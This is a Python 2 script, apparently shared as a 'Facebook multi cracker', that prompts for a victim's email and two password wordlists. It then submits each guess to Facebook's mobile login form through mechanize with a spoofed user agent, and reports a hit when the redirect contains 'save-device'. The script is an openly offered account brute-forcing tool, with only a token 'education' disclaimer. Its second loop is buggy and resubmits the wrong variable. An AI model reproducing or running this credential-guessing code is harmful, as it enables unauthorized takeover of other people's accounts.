import cookielib
import mechanize
import os
import time


W = "\033[0m"
G  = '\033[32;1m'
R = '\033[31;1m'
                 
os.system("figlet FB ")
os.system("figlet Cracker")
     


print G+ '''

    @DISCRIPTION: THIS IS A MULTI TOOL FOR HACKING ONE FB BY A DEEFRENT 

PASSWORDLSIT BY LETTER LIKE : AAAAAA,AAAAAB,AAAAAC,AAAAAD

THIS TOOLS IS VERY FAST IF KB IS HIGH ,TRY TO CONFIRM YOUR VICTIME EMAIL 

IS CORRECT AND THERE IS'NT ANY FALSE 

'''
     
print R+ '''
     $ADVICE: [@] BEFORE USING THIS TOOL,YOU OUGHT TO WORKING YOU DATA 

EXTERNEL OR #WIFI# AND WIFT IS VERY BETTER
      
[+] CREATE YOUR PASSWORDLIST BY INSTALLING #WORDLIST# REQUIREMENT,I WILL 

PUT IT IN A  FILE FOR AUTOINSTALLATION

[+] YOU CAN USE MULTI SESSION AND HACK WITH A LOT OF LISTS 

[+] THIS IS FOR EDUCATION AND VERIFICATION 

[+] I'M NEVER RESPONSABLE ABOUT YOU DOING BY MY TOOLS 

[+] DISCLAIMER:ALL COPYRIGHT WAS RESERVED


'''

     
print W+ '''

     [+] Author: MZOIR ZAKARIYA
     [+] Email : mzliker99@gmail.com
     [+] Date : 27/06/2019
     [+] Youtube : https://youtu.be/iO0BXSZj-Bo
     [+] Name : facebook-multi-cracker
'''

print W + '''

  
        ============================
      ---->>>>_______________<<<<<<<<-----
     &      FACEBOOK MULTI BRUTE          $
      / / / / / / / / / / / / / / / / / / /
        ============================
'''
           
                    
#input(informormation from user)
print G+'''   [+] YOU NEED TO WRITE THE VICTIME'S EMAIL '''
email = str(raw_input(W+'your victime email/id/username.....:'))
     
print R+ '''  [+] YOU NEED TO ENTER THE FISRT LIST FOR GHUSSING'''
passlist = str(raw_input(W+"your passwordlist by letter:"))
#second_list
     
print G+ '''  [+] YOU NEED TO ENTER SECOND LIST FOR GUESSING'''
passwlist=str(raw_input(W+"Your second  passwordlist by letter:"))            
                        
#quess1
#open/browser1
#open_passworefile
       
f = open(passlist,"r")
d = f.readlines()
for password in d:
   #open/browser1 
    print 'Trying.from first list......{}'.format(password)
    br = mechanize.Browser()
    br.addheaders = [('User-agent', 'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J120H Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.5 Chrome/38.0.2125.102 Mobile Safari/537.36')]
    br.set_handle_robots(False)
    url='http://m.facebook.com/login' 
    h = br.open(url)
    br.select_form(nr = 0)
    br.form['email'] = email
    br.form['pass'] = password 
    sub = br.submit()
    log = sub.geturl()
    print log
    if 'save-device' in log:             
         print R+ '[+] PASSWORD IS %:[{}]'.format(password)
         exit()
#quess2
#open_secc_passlist
      
g = open(passwlist,"r")
d = g.readlines()
for passw in d:     
      #open/browser1
      print W+'Trying password from second list.......{}'.format(passw)
      br = mechanize.Browser()
      br.addheaders = [('User-agent','Mozilla/5.0 (Linux; Android 5.1.1;SAMSUNG SM-J120H Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko)SamsungBrowser/3.5 Chrome/38.0.2125.102 Mobile Safari/537.36')]
      br.set_handle_robots(False)
      url='http://m.facebook.com/login'
      h = br.open(url)
      br.select_form(nr = 0)
      br.form['email'] = email
      br.form['pass'] = password
      r  = br.submit()
      j = r.geturl()
      print j
      if 'save-device' in j:
             print R+'[+] PASSWORD[2] IS :[{}]'.format(passw)
             exit()
